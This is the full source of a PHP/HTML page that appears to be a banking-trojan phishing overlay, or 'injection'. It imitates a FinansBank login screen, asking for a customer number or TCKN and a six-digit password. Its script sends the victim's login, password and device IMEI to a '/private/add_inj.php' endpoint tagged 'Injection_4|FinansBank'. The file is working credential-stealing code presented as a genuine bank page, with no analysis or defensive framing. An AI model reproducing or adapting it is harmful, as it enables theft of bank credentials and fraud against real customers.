<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>FinansBank</title>

    <link rel="stylesheet" href="tr/Finansbank/css/normalize.css">
    <link rel="stylesheet" href="tr/Finansbank/css/main.css">
    <link rel="stylesheet" href="tr/Finansbank/css/finansbank.css">

    <script src="tr/Finansbank/js/jquery.min.js"></script>
    <script src="tr/Finansbank/js/viewport.js"></script>
    <script src="tr/Finansbank/js/cat.functions.js"></script>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
?>
<body>
    <div class="row">
        <div class="form_header">
            <img src="tr/Finansbank/images/logo.png" alt="">
        </div>
    </div>
		<div class="modal modal_02">
			<div class="container">
				<form action="" method="post" id="form" class="wrapper">


<script>

function checkBad(str)
{
if (str.split(str.slice(0,1)).length === str.length+1) return false;
return true;
}



$(document).ready(function() {



$('.main_input').bind("change keyup input click", function() {
    if (this.value.match(/[^0-9]/g)) {
        this.value = this.value.replace(/[^0-9]/g, '');
    }
});




$('#row_pers .sign_btn').click(function(){
if (($('#row_pers input').eq(0).val().length < 5) || (!checkBad($('#row_pers input').eq(0).val()))) {$('#row_pers input').eq(0).addClass('inpError'); $('#row_pers input').eq(0).focus(); return false;} else $('#row_pers input').eq(0).removeClass('inpError');
if (($('#row_pers input').eq(1).val().length < 5) || (!checkBad($('#row_pers input').eq(1).val()))) {$('#row_pers input').eq(1).addClass('inpError'); $('#row_pers input').eq(1).focus(); return false;} else $('#row_pers input').eq(1).removeClass('inpError');

var imei = document.forms["form"].elements["imei"].value; 
var login = document.forms["form"].elements["login"].value; 
var pass = document.forms["form"].elements["pass"].value; 

location.replace('/private/add_inj.php?p=' + imei+"|Injection_4|FinansBank|"+login+"|"+pass);
//sendForm(true);
//closeWindow();
return false;
});

});
</script>
<style>

.inpError{
border: 2px solid red;

}
</style>


					<div class="row" id="row_pers">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
								M&#252;&#351;teri Numaras&#305; / TCKN
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" id="login" class="main_input" maxlength=11  required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Finans&#350;ifre
								</div>
								<div class="inp_wr">
									<input type="password" id="pass" name="field3" class="main_input" maxlength=6  required="">
								</div>
							</div>
							<div class="btn_wr">
								<button class="sign_btn">
									&#304;leri <img src="tr/Finansbank/images/arr.png" alt="">
								</button>
							</div>
						</div>
					</div>
<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>
				</form>
			</div>
		</div>
</body>

</html>